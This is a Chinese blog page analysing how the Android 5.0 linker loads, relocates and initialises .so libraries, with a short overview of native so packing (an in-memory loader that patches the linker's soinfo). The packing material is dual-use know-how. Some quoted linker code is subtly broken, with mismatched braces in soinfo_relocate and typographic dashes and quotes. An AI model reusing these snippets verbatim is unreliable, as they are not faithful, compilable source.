<p>2.<strong>如果sym不为0，则查找导入符号的信息</strong><br>如果sym不为0，则继续使用sym在符号表中获取符号信息，从符号信息中进一步获取符号的名称。随后调用<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/linker.cpp#482">soinfo_do_lookup</a>函数在所有依赖的so中根据符号名称查找符号信息，返回值类型为<code>elf32_sym</code>，同时还会返回含有该符号的so的soinfo( lsi )，如果查找成功则该导入符号的地址为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sym_addr &#x3D; s-&gt;st_value + lsi-&gt;load_bias;</span><br></pre></td></tr></table></figure>
<p>3.<strong>修正需要重定位的地址</strong><br>根据重定位类型的不同，修正重定位地址，具体的重定位类型定义和计算方法可以参考aaelf文档的 4.6.1.2 节。<br>对于导入符号，则使用根据第二步得到<code>sym_addr</code>去修正，对于so内部的相对偏移修正，则直接将reloc的地址加上so的基址。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">soinfo_relocate</span><span class="params">(soinfo* si, ElfW(Rel)* rel, <span class="keyword">unsigned</span> count, soinfo* needed[])</span> </span>&#123;</span><br><span class="line">    ElfW(Sym)* s;</span><br><span class="line">    soinfo* lsi;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> idx = <span class="number">0</span>; idx &lt; count; ++idx, ++rel) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> type = ELFW(R_TYPE)(rel-&gt;r_info);</span><br><span class="line">        <span class="keyword">unsigned</span> sym = ELFW(R_SYM)(rel-&gt;r_info);</span><br><span class="line">        ElfW(Addr) reloc = <span class="keyword">static_cast</span>&lt;ElfW(Addr)&gt;(rel-&gt;r_offset + si-&gt;load_bias);</span><br><span class="line">        ElfW(Addr) sym_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* sym_name = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="number">0</span>) &#123; <span class="comment">// R_*_NONE</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sym != <span class="number">0</span>) &#123;</span><br><span class="line">            sym_name = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(si-&gt;strtab + si-&gt;symtab[sym].st_name);</span><br><span class="line">            s = soinfo_do_lookup(si, sym_name, &amp;lsi, needed);</span><br><span class="line">            <span class="keyword">if</span> (s == <span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           sym_addr = <span class="keyword">static_cast</span>&lt;ElfW(Addr)&gt;(s-&gt;st_value + lsi-&gt;load_bias);&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s = <span class="literal">NULL</span>;&#125;</span><br><span class="line">        <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_JUMP_SLOT:</span><br><span class="line">            *<span class="keyword">reinterpret_cast</span>&lt;ElfW(Addr)*&gt;(reloc) = sym_addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_GLOB_DAT:</span><br><span class="line">            *<span class="keyword">reinterpret_cast</span>&lt;ElfW(Addr)*&gt;(reloc) = sym_addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_ABS32:</span><br><span class="line">            *<span class="keyword">reinterpret_cast</span>&lt;ElfW(Addr)*&gt;(reloc) += sym_addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_REL32:</span><br><span class="line">            *<span class="keyword">reinterpret_cast</span>&lt;ElfW(Addr)*&gt;(reloc) += sym_addr – rel-&gt;r_offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_COPY:</span><br><span class="line">            DL_ERR(<span class="string">&quot;%s R_ARM_COPY relocations are not supported&quot;</span>, si-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">case</span> R_ARM_RELATIVE:</span><br><span class="line">            <span class="keyword">if</span> (sym) &#123;</span><br><span class="line">                DL_ERR(<span class="string">&quot;odd RELATIVE form…&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *<span class="keyword">reinterpret_cast</span>&lt;ElfW(Addr)*&gt;(reloc) += si-&gt;base;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            DL_ERR(<span class="string">&quot;unknown reloc type %d @ %p (%zu)&quot;</span>, type, rel, idx);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CallConstructors"><a href="#CallConstructors" class="headerlink" title="CallConstructors"></a>CallConstructors</h2><p>在编译so时，可以通过链接选项<code>-init</code>或是给函数添加属性<code>__attribute__((constructor))</code>来指定so的初始化函数，这些初始化函数在so装载链接后便会被调用，再之后才会将so的<code>soinfo</code>指针返回给<code>dl_open</code>的调用者。so层面的保护手段，有两个介入点, 一个是<code>jni_onload</code>，另一个就是初始化函数，比如反调试、脱壳等，逆向分析时经常需要动态调试分析这些初始化函数。完成so的装载链接后，返回到<code>do_dlopen</code>函数，<code>do_open</code>获得<code>find_library</code>返回的刚刚加载的so的<code>soinfo</code>，在将<code>soinfo</code>返回给其他模块使用之前，最后还需要调用<code>soinfo</code>的成员函数<code>CallConstructors</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">soinfo* <span class="title">do_dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">int</span> flags, <span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  soinfo* si = find_library(name, flags, extinfo);</span><br><span class="line">  <span class="keyword">if</span> (si != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    si-&gt;CallConstructors();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> si;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CallConstructors</code>函数会首先调用当前so文件调用的所有其他so文件的<code>CallConstructors</code>函数，接着调用自己的<code>soinfo</code>成员变量<code>init</code>和看<code>init_array</code>指定的函数，这两个变量在解析dynamic section时赋值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">soinfo::CallConstructors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (constructors_called) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  get_children().for_each([] (soinfo* si) &#123;</span><br><span class="line">    si-&gt;CallConstructors(); </span><br><span class="line">  &#125;;</span><br><span class="line">  CallFunction(<span class="string">&quot;DT_INIT&quot;</span>, init_func);</span><br><span class="line">  CallArray(<span class="string">&quot;DT_INIT_ARRAY&quot;</span>, init_array, init_array_count, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了以上分析基础后，在需要动态跟踪初始化函数时，我们就知道可以将断点设在<code>do_dlopen</code>或是<code>CallConstructors</code>。</p>
<h2 id="加壳技术"><a href="#加壳技术" class="headerlink" title="加壳技术"></a>加壳技术</h2><p>在病毒和版权保护领域，“壳”一直扮演着极为重要的角色。通过加壳可以对代码进行压缩和加密，同时再辅以虚拟化、代码混淆和反调试等手段，达到防止静态和动态分析。<br>在Android环境中，Native层的加壳主要是针对动态链接库so，so加壳的示意图如下:<br><img src="/images/androidre/packed_so.png"></p>
<ul>
<li>so：即被保护的目标so。</li>
<li>loader：自身也是一个so，系统加载时首先加载loader，loader首先还原出经过加密、压缩、变换的so，再将so加载到内存，并完成链接过程，使so可以正常被其他模块使用。</li>
<li>加壳工具：将被保护的so加密、压缩、变换，并将结果作为数据与loader整合为packed so。</li>
</ul>
<p>下面对so加壳的关键技术进行简单介绍。</p>
<h3 id="loader执行时机"><a href="#loader执行时机" class="headerlink" title="loader执行时机"></a>loader执行时机</h3><p>Linker加载完loader后，loader需要将被保护的so加载起来，这就要求loader的代码需要被执行，而且要在被保护so被使用之前，前文介绍了so的初始化函数便可以满足这个要求，同时在Android系统下还可以使用<code>JNI_ONLOAD</code>函数，因此loader的执行时机有两个选择:</p>
<ul>
<li>so的init或initarray</li>
<li>jni_onload</li>
</ul>
<h3 id="loader完成so的加载链接"><a href="#loader完成so的加载链接" class="headerlink" title="loader完成so的加载链接"></a>loader完成so的加载链接</h3><p>loader开始执行后，首先需要在内存中还原出so，so可以是经过加密、压缩、变换等手段，也可已单纯的以完全明文的数据存储，这与so加壳的技术没有必要的关系，在此不进行讨论。<br>在内存中还原出so后，loader还需要执行装载和链接，这两个过程可以完全模仿Linker来实现，下面主要介绍一下相对Linker，loader执行这两个过程有哪些变化。</p>
<h4 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h4><p>还原后的so在内存中，所以装载时的主要变化就是从文件装载到从内存装载。<br>Linker在装载PT_LAOD segment时，使用so文件的描述符fd：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* seg_addr = mmap(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(seg_page_start),</span><br><span class="line">                      file_length,</span><br><span class="line">                      PFLAGS_TO_PROT(phdr-&gt;p_flags),</span><br><span class="line">                      MAP_FIXED|MAP_PRIVATE,</span><br><span class="line">                      fd_,file_page_start);</span><br></pre></td></tr></table></figure>
<p>按照Linker装载，PT_LAOD segment时，需要分为两步：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* seg_addr = mmap(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(seg_page_start),</span><br><span class="line">                      file_length,</span><br><span class="line">                      PFLAGS_TO_PROT(phdr-&gt;p_flags),</span><br><span class="line">                      MAP_FIXED|MAP_PRIVATE,</span><br><span class="line">                      <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(seg_addr+seg_page_offset, elf_data_buf + phdr-&gt;p_offset, phdr-&gt;p_filesz);</span><br></pre></td></tr></table></figure>
<p>注意第2步复制segment时，目标地址需要加上<code>seg_page_offset</code>，<code>seg_page_offset</code>是segment相对与页面起始地址的偏移。<br>其他的步骤基本按照Linker的实现即可，只需要将一些从文件读取修改为从内存读取，比如读elfheader和program header时。</p>
<h4 id="分配soinfo"><a href="#分配soinfo" class="headerlink" title="分配soinfo"></a>分配soinfo</h4><p><code>soinfo</code>保存了so装载链接和运行时需要的所有信息，为了维护相关的信息，loader可以照搬Linker的<code>soinfo</code>结构，用于存储中间信息，装载链接结束后，还需要将<code>soinfo</code>的信息修复到Linker维护的<code>soinfo</code>，下面进行详细说明。</p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>链接过程完全是操作内存，不论是从文件装载还是内存装载，链接过程都是一样，完全模仿Linker即可。<br>另外链接后记得顺便调用so初始化函数(init和init_array)。</p>
<h3 id="soinfo修复"><a href="#soinfo修复" class="headerlink" title="soinfo修复"></a>soinfo修复</h3><p>so加壳的最关键技术点在于<code>soinfo</code>的修复，由于Linker加载的是loader，而实际对外使用的是被保护的so，所以Linker维护的<code>soinfo</code>可以说是错误，loader需要将自己维护的<code>soinfo</code>中的部分信息导出给Linker的<code>soinfo</code>。<br>修复过程如下：<br>获取Linker维护的<code>soinfo</code>，可以通过<code>dlopen</code>打开自己来获得：self_soinfo = dlopen(self)。<br>将loader <code>soinfo</code>中的信息导出到<code>self_soinfo</code>，最简单粗暴的方式就是直接赋值，比如：self_soinfo.base = soinfo.base。需要导出的主要有以下几项：</p>
<ul>
<li>so地址范围：base、size、load_bias</li>
<li>符号信息：sym_tab、str_tab、</li>
<li>符号查找信息：nbucket、nchain、bucket、chain</li>
<li>异常处理：ARM_exidx、ARM_exidx_count</li>
</ul>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://yaq.qq.com/blog/15">http://yaq.qq.com/blog/15</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/02/Android-Linker%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/02/Android-Linker%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">Android Linker（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-02 22:55:32" itemprop="dateCreated datePublished" datetime="2017-07-02T22:55:32+08:00">2017-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>目前Android应用加固可以分为dex加固和Native加固，Native加固的保护对象为Native层的so文件，使用加壳、反调试、混淆、VM等手段增加so文件的反编译难度。目前最主流的so文件保护方案还是加壳技术， 在so文件加壳和脱壳的攻防技术领域，最重要的基础的便是对于Linker即装载链接机制的理解。本文分析了so文件的装载和链接过程，也就是在调用dlopen(“libxx.so”)之后，Linker的处理过程，还对so加壳的关键技术进行了简要介绍。<br>本文基于Android5.0 AOSP源码，仅针对ARM平台。</p>
<h2 id="so装载"><a href="#so装载" class="headerlink" title="so装载"></a>so装载</h2><h3 id="整体流程说明"><a href="#整体流程说明" class="headerlink" title="整体流程说明"></a>整体流程说明</h3><p>Java层调用so中的native函数都会有一个调用语句：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Static &#123;</span><br><span class="line">  System.loadLibrary(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从这条语句开始的调用流程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;java&#x2F;lang&#x2F;System.java:loadLibrary()</span><br><span class="line">&#x2F;libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;java&#x2F;lang&#x2F;Runtime.java:loadLibrary()</span><br><span class="line">&#x2F;libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;java&#x2F;lang&#x2F;Runtime.java:doLoad()</span><br><span class="line">&#x2F;libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;java&#x2F;lang&#x2F;Runtime.java:nativeLoad()</span><br><span class="line">&#x2F;dalvik&#x2F;vm&#x2F;native&#x2F;java_lang_Runtime.cpp:Dalvik_java_lang_Runtime_nativeLoad()</span><br><span class="line">&#x2F;dalvik&#x2F;vm&#x2F;Native.cpp:dvmLoadNativeCode()</span><br><span class="line">&#x2F;bionic&#x2F;linker&#x2F;dlfcn.cpp:dlopen()</span><br></pre></td></tr></table></figure>
<p>整个流程是通过查看<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/">Android源码</a>，进行交叉引用，代码跟踪找到的。至此开始正式的分析。</p>
<h4 id="do-dlopen"><a href="#do-dlopen" class="headerlink" title="do_dlopen"></a>do_dlopen</h4><p>调用<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/dlfcn.cpp#82">dlopen</a>后，中间经过<code>dlopen_ext</code>, 到达第一个主要函数<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/linker.cpp#910">do_dlopen</a>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">soinfo* <span class="title">do_dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">int</span> flags, <span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  protect_data(PROT_READ | PROT_WRITE);</span><br><span class="line">  soinfo* si = find_library(name, flags, extinfo); <span class="comment">// 查找so</span></span><br><span class="line">  <span class="keyword">if</span> (si != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    si-&gt;CallConstructors(); <span class="comment">// 调用so的init函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  protect_data(PROT_READ);</span><br><span class="line">  <span class="keyword">return</span> si;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>do_dlopen</code>调用了两个重要的函数，第一个是<code>find_library</code>，第二个是<code>soinfo</code>的成员函数 <code>CallConstructors</code>，<code>find_library</code>函数的作用是查找并加载动态链接库，完成so的装载链接后，通过 <code>CallConstructors</code>调用so的初始化函数。</p>
<h4 id="find-library-internal"><a href="#find-library-internal" class="headerlink" title="find_library_internal"></a>find_library_internal</h4><p><a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/linker.cpp#842">find_library</a>直接调用了<code>find_library_internal</code>，下面直接看<code>find_library_internal</code>函数：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> soinfo* <span class="title">find_library_internal</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">int</span> dlflags, <span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> somain;</span><br><span class="line">  &#125;</span><br><span class="line">  soinfo* si = find_loaded_library_by_name(name);  <span class="comment">// 判断so是否已经加载</span></span><br><span class="line">  <span class="keyword">if</span> (si == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    TRACE(“[ ‘%s’ has <span class="keyword">not</span> been found by name.  Trying harder…]”, name);</span><br><span class="line">    si = load_library(name, dlflags, extinfo);     <span class="comment">// 继续so的加载流程</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (si != <span class="literal">NULL</span> &amp;&amp; (si-&gt;flags &amp; FLAG_LINKED) == <span class="number">0</span>) &#123;</span><br><span class="line">    DL_ERR(“recursive link to \”%s\””, si-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> si;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>find_library_internal</code>首先通过<code>find_loaded_library_by_name</code>函数判断目标so是否已经加载，如果已经加载则直接返回对应的<code>soinfo</code>指针，没有加载的话则调用<code>load_library</code>继续加载流程，下面看<code>load_library</code>函数。</p>
<h4 id="load-library"><a href="#load-library" class="headerlink" title="load_library"></a>load_library</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> soinfo* <span class="title">load_library</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">int</span> dlflags, <span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Open the file.</span></span><br><span class="line">  fd = open_library(name);                <span class="comment">// 打开so文件，获得文件描述符fd</span></span><br><span class="line"></span><br><span class="line">  <span class="function">ElfReader <span class="title">elf_reader</span><span class="params">(name, fd)</span></span>;         <span class="comment">// 创建ElfReader对象</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Read the ELF header and load the segments.</span></span><br><span class="line">  <span class="keyword">if</span> (!elf_reader.Load(extinfo)) &#123;        <span class="comment">// 使用ElfReader的Load方法，完成so装载</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  soinfo* si = soinfo_alloc(SEARCH_NAME(name), &amp;file_stat);  <span class="comment">// 为so分配新的soinfo结构</span></span><br><span class="line">  <span class="keyword">if</span> (si == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  si-&gt;base = elf_reader.load_start();  <span class="comment">// 根据装载结果，更新soinfo的成员变量</span></span><br><span class="line">  si-&gt;size = elf_reader.load_size();</span><br><span class="line">  si-&gt;load_bias = elf_reader.load_bias();</span><br><span class="line">  si-&gt;phnum = elf_reader.phdr_count();</span><br><span class="line">  si-&gt;phdr = elf_reader.loaded_phdr();</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (!soinfo_link_image(si, extinfo)) &#123;  <span class="comment">// 调用soinfo_link_image完成so的链接过程</span></span><br><span class="line">    soinfo_free(si);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> si;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>load_library</code>函数呈现了so装载链接的整个流程，主要有3步:</p>
<ul>
<li>装载：创建ElfReader对象，通过ElfReader对象的Load方法将so文件装载到内存</li>
<li>分配soinfo：调<code>soinfo_alloc</code>函数为so分配新的soinfo结构，并按照装载结果更新相应的成员变量</li>
<li>链接：调用<code>soinfo_link_image</code>完成so的链接</li>
</ul>
<p>通过前面的分析，可以看到，<code>load_library</code>函数中包含了so装载链接的主要过程，下面主要通过分析 <code>ElfReader</code>类和<code>soinfo_link_image</code>函数, 来分别介绍so的装载和链接过程。</p>
<h3 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h3><p>在<code>load_library</code>中，首先初始化<code>elf_reader</code>对象，第一个参数为so的名字，第二个参数为文件描述符fd，之后调用<code>ElfReader</code>的<code>Load</code>方法装载so。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElfReader <span class="title">elf_reader</span><span class="params">(name, fd)</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Read the ELF header and load the segments.</span></span><br><span class="line"><span class="keyword">if</span> (!elf_reader.Load(extinfo)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ElfReader::Load</code>方法如下:  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ElfReader::Load</span><span class="params">(<span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ReadElfHeader() &amp;&amp;             <span class="comment">// 读取elf header</span></span><br><span class="line">         VerifyElfHeader() &amp;&amp;           <span class="comment">// 验证elf header</span></span><br><span class="line">         ReadProgramHeader() &amp;&amp;         <span class="comment">// 读取program header</span></span><br><span class="line">         ReserveAddressSpace(extinfo) &amp;&amp;<span class="comment">// 分配空间</span></span><br><span class="line">         LoadSegments() &amp;&amp;              <span class="comment">// 按照program header指示装载segments</span></span><br><span class="line">         FindPhdr();                    <span class="comment">// 找到装载后的phdr地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ElfReader::Load</code>方法首先读取so的elf header，再对elf header进行验证，之后读取program header，根据program header计算so需要的内存大小并分配相应的空间，紧接着将so按照以segment为单位装载到内存，最后在装载到内存的so中找到program header，方便之后的链接过程使用。<br>下面深入<code>ElfReader</code>的这几个成员函数进行详细介绍。</p>
<h4 id="read-amp-verify-elfheader"><a href="#read-amp-verify-elfheader" class="headerlink" title="read &amp; verify elfheader"></a>read &amp; verify elfheader</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ElfReader::ReadElfHeader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> rc = read(fd_, &amp;header_, <span class="keyword">sizeof</span>(header_));</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (rc != <span class="keyword">sizeof</span>(header_)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
